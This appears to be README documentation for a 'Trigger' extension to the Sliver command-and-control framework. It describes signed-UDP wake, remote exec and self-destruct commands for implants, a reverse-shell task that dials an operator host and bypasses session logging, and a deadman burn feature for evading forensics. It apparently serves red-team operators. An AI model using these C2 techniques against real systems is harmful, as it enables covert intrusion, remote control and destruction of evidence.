The Trigger feature adds an **authenticated, quiet, signed-UDP task dispatcher** to Sliver. Operators start a listener with one or more task bindings; signed UDP packets from anywhere in the world fire the bound action. No TCP, no clock-driven beacon traffic, no ACK packets that telegraph the listener's existence.

It's the right tool for: "wake this implant now," "kill that listener," "fire this shell-out," "burn that implant." The protocol is integrity-only -- see the **Security Model** section below for what it does and doesn't protect.

The listener core is imported as a library (`github.com/0x90pkt/trigger/pkg/listener`) -- the Sliver fork just provides the gRPC bridge, the console commands, and Sliver-specific task handlers.

All trigger operations are built into sliver-server and sliver-client. No external binaries are needed.

## Trigger implant architecture

Every trigger implant has **two operational modes**, both always baked in:

1. **Ad-hoc exec** -- bidirectional UDP command execution. The operator fires a signed "exec" packet; the implant runs the command and returns output over UDP. No C2 session required.

2. **Wake session** -- on receipt of a signed "wake" packet, the implant establishes an **interactive SESSION** (not a beacon) over its configured C2 transports. For maximum flexibility, specify both `--mtls` (TCP) and `--wg` (UDP) when generating the implant.

Trigger implants **never use beacon mode**. The wake callback always establishes a full interactive session.

# Quickstart

```
sliver > trigger --lhost 0.0.0.0 --lport 46290 \
                 --secret-env TRIGGER_SECRET \
                 --server-id site-A \
                 --task wake-jumpbox:wake-beacon:<beacon-uuid> \
                 --task kill-mtls:stop-job:mtls-8443

[*] Starting trigger listener on 0.0.0.0:46290 ...
[*] Successfully started trigger listener as job #4
[*] Registered tasks:
      wake-jumpbox  wake-beacon -> beacon=<beacon-uuid>
      kill-mtls     stop-job    -> job=mtls-8443
```

Send a wake from the sliver console (no external tools):

```
sliver > trigger send <target-ip> wake \
             --secret-env TRIGGERWAKE_SECRET \
             --client-id operator-jc \
             --comms mtls

[*] Firing trigger packet: target=<target-ip>:46290 intent=wake client-id=operator-jc
[*] Trigger packet sent to <target-ip>:46290 (intent=wake)
[*] Note: UDP is fire-and-forget -- delivery is not confirmed.
```

Or by trigger index (auto-populates port, secret, target from stored config):

```
sliver > triggers
 Index  Name           OS/Arch       Bind Port  C2 Transports  Allowed Clients  Target
 1      jumpbox-impl   linux/amd64   46290      mtls,wg        operator-jc      10.0.0.42

sliver > trigger send 1 wake --comms wg
```

Dispatch a server-side task (no UDP, no HMAC -- handler runs in-process):

```
sliver > trigger dispatch 4 wake-jumpbox

[*] Dispatching task "wake-jumpbox" on job #4 ...
[*]   wake-session -> beacon=<beacon-uuid>
[*] Task "wake-jumpbox" dispatched successfully on job #4
```

Server-side audit logs (in Sliver's standard log dir under `c2/trigger-audit`):

```
INFO ACCEPT event=trigger_attempt server=site-A client=operator-jc \
            intent=wake-jumpbox source=10.0.0.5 nonce=ab12... reason=accepted
```

# Task kinds

Each `--task` flag is a `NAME:KIND:ARGS` triple. The operator picks the name (what the wire packet carries); the kind selects which Sliver-side handler runs.

### `wake-session` (alias: `wake-beacon`)

Fires a wake signal for a trigger implant. Trigger implants establish an **interactive session** (not a beacon) when woken. For backward compatibility with legacy beacon configurations, the handler also updates the beacon's `NextCheckin` field if the target UUID corresponds to an existing beacon.

```
--task wake-jumpbox:wake-beacon:8e7f1c0a-1234-5678-90ab-cdef01234567
```

Argument: the target UUID (`sessions` or `beacons` shows it).

### `stop-job`

Stops a Sliver job by name. First active match wins; if you have multiple jobs with the same name, bind multiple tasks with distinct labels.

```
--task kill-mtls:stop-job:mtls
--task kill-https:stop-job:https
```

Argument: the job's `Name` field (`jobs` shows it).

### `exec`

Run a configured command on the Sliver server host. **Designed not to be a shell-injection backdoor**:

- Absolute-path command + pre-split argv. **No shell interpolation**, no `sh -c "..."` codepath.
- Subprocess starts with a fresh, minimal environment containing only `PATH`, `HOME`, task context (`INTENT`, `CLIENT_ID`, `SOURCE_IP`, `NONCE`, `TIMESTAMP`), plus whatever the operator added via the binding. **The operator's HMAC shared secret cannot leak into the subprocess.**
- Per-invocation context deadline (default 10s) kills runaways.
- Bounded stdout/stderr capture (64KB).

```
--task run-rotate:exec:/usr/local/bin/rotate-keys.sh,--verbose
```

Argument: absolute-path command, then comma-separated args (no shell quoting; one arg per comma-separated token).

### `reverse-shell`

Dial a pre-bound operator endpoint over TCP (optionally TLS), exec a shell, plumb stdin/stdout/stderr over the socket. **Bypasses Sliver's session machinery entirely** -- no session record, no entry in `sessions`, no Sliver session logs. Audited only in the trigger's own log.

```
--task shellback:reverse-shell:10.0.0.5:4444,tls
```

Argument: `host:port` of the operator's listening shell, optionally `,tls` to wrap the connection. Shell path defaults to `/bin/sh -i` on Unix and `cmd.exe` on Windows; configurable per binding.

The bind-config approach means a crafted `client_id` can't redirect the shell to an attacker's endpoint -- the destination is locked at listener-start.

# Commands

| Command | Purpose |
|---|---|
| `generate trigger ...` | Build a trigger implant (two modes: ad-hoc exec + wake session) |
| `triggers` | List all generated trigger implants (indexed) |
| `triggers target <index> <ip>` | Associate a deployment IP with a trigger implant |
| `trigger ...` | Start a server-side trigger listener with task bindings |
| `trigger tasks <job-id>` | Print the bindings registered against a running listener |
| `trigger dispatch <job-id> <task-name>` | Dispatch a server-side task handler (no UDP, runs in-process) |
| `trigger send <target-ip\|index> <intent>` | Send a signed UDP packet to an implant (wake, self-destruct, exec) |
| `jobs` | Lists all jobs including trigger listeners |
| `jobs --kill <id>` | Stop a trigger listener (reuses Sliver's generic job kill) |

# Configuration

| Flag | Meaning |
|---|---|
| `--lhost` / `--lport` | UDP bind |
| `--secret-env` | env var NAME on the **operator** host holding the HMAC shared secret. Read locally, sent over mTLS-protected gRPC to the server. Avoids putting raw secrets in argv. |
| `--server-id` | Audit identifier embedded in events |
| `--task` | Repeatable; `NAME:KIND:ARGS` (see above) |
| `--allowed-source` | Repeatable; exact IP or CIDR (v4/v6). Empty = any source. |
| `--allowed-client` | Repeatable; client_id allowlist. Empty = any signed client. |

# Implant-side wake + self-destruct

When an implant is built with `IncludeTriggerWake=true` in its config (always true for `generate trigger`), it runs a **passive UDP listener** before any C2 traffic. The implant blocks on the wake channel until an operator explicitly wakes it -- zero network traffic until then. Three hardcoded intents:

- `wake` -- unblocks the C2 channel so the implant establishes an **interactive session** (not a beacon). On initial startup this is the first C2 dial-home; on subsequent wakes it re-establishes the session.
- `self-destruct` -- fires the implant's burn primitive (self-deletes the binary, wipes the operator-configured persistence artifacts, exits).
- `exec` -- **bidirectional**: executes a command on the implant and sends the output back to the operator over UDP. The command is specified in the `--payload` flag. Output is capped at ~7KB and the exec timeout is 30 seconds. The response is HMAC-signed with the same shared secret.

**Transport options for the wake callback:**
- `--mtls` -- TCP callback via mTLS. Reliable, works through most NAT/firewalls.
- `--wg` -- UDP callback via WireGuard. Lower overhead.
- Recommended: specify **both** `--mtls` and `--wg` for maximum flexibility.

Example:

```
sliver > trigger send 10.0.0.5 exec \
             --payload "id" \
             --secret-env TRIGGERWAKE_SECRET

[*] Firing trigger packet: target=10.0.0.5:46290 intent=exec client-id=sliver-operator
[*] Payload: id
[*] Trigger packet sent to 10.0.0.5:46290 (intent=exec)
[*] Exit code: 0
[*] Output:
uid=1000(user) gid=1000(user) groups=1000(user)
```

These intents are baked in at implant build time -- not operator-configurable post-build -- because the implant runs in hostile environments where exposing a dispatch surface would be a foothold.

The implant's bind address, HMAC secret, and per-client allowlist all come from `ImplantConfig` template fields (`TriggerWakeBindAddr`, `TriggerWakeSecret`, `TriggerWakeAllowedClientIDs`) populated at build time.

## TTL (deadman switch)

When the implant is built with `TTLEnabled=true`, a minute-cadence ticker starts counting down from process start (not build time). Two layers enforce the TTL:

**Primary — implant-side watchdog.** The implant computes its deadline as `time.Now() + TTLMinutes` at process startup. Every authenticated trigger packet (any intent: wake, exec, self-destruct) resets the countdown to a fresh `TTLMinutes` from now. An actively-used implant never self-destructs from TTL. When the deadline expires without activity, the implant burns itself — same path as operator-fired self-destruct, same `BurnExtraPaths` + `BurnPersistence` lists.

**Fallback — server-side reaper.** The Sliver server runs a background sweep every 5 minutes. It tracks trigger implant activity (updated on every `trigger send` call) and, if an implant has gone silent past its TTL, fires a self-destruct packet as a last resort. Rate-limited to one attempt per hour per implant.

Key design properties:

- **TTL starts at runtime, not build time.** The implant binary can be stored and reused across deployments without expiring on the shelf. Only `TTLMinutes` is baked in — no absolute timestamp.
- **Activity resets the countdown.** Any authenticated signal proves the operator is alive and extends the deadline.
- **Two-layer defense-in-depth.** If the implant's watchdog fails (crash, bug), the server attempts cleanup.

Configurable per build via `--ttl <duration>` (minimum 1 minute). Example: `--ttl 720h` for 30 days.

# Security model

| Property | Mechanism |
|---|---|
| Message integrity | HMAC-SHA256 over canonical JSON, `hmac.Equal` (constant time) |
| Sender identity | Per-client key registry (`--allowed-client` + future per-client secrets) |
| Replay defense | TTL'd nonce cache, bounded; over-cap inserts refuse rather than silently evict |
| Source allowlist | Exact IPs + CIDR ranges, v4 + v6 |
| Pre-HMAC DoS | Global packets-per-second cap (source-IP-agnostic; UDP source is forgeable) |
| Post-HMAC fairness | Per (client_id, source_ip) cap, applied after auth |
| Handler isolation | ctx deadline + panic recovery |
| No timing oracle | NO ACK packets emitted. Every reject branch is silent -- only the audit log knows. |

## What it doesn't protect

- **Confidentiality.** Task labels, client_ids, and nonces ride in plaintext over UDP. Wrap with DTLS or run over a VPN if you need confidentiality.
- **Transport identity.** HMAC proves the message was signed with a known key; it doesn't prove who typed the trigger. Pair per-client keys with operational controls (one key per operator).
- **Forensic invisibility of self-destruct.** The burn primitive zero-fills + unlinks on POSIX and best-effort-deletes on Windows. A defender with a pre-burn disk image can still recover binaries.

# Wire protocol

JSON over UDP. Canonical signable payload uses Go's deterministic alphabetical key order so cross-language ports (Python, Rust) produce byte-identical HMAC inputs. Version pinned at `1`; any wire change MUST bump the version and break verifying receivers.

The standalone repo (`github.com/0x90pkt/trigger`) carries locked wire-compat regression vectors (`pkg/protocol/vectors_test.go`) -- those are the reference contract.
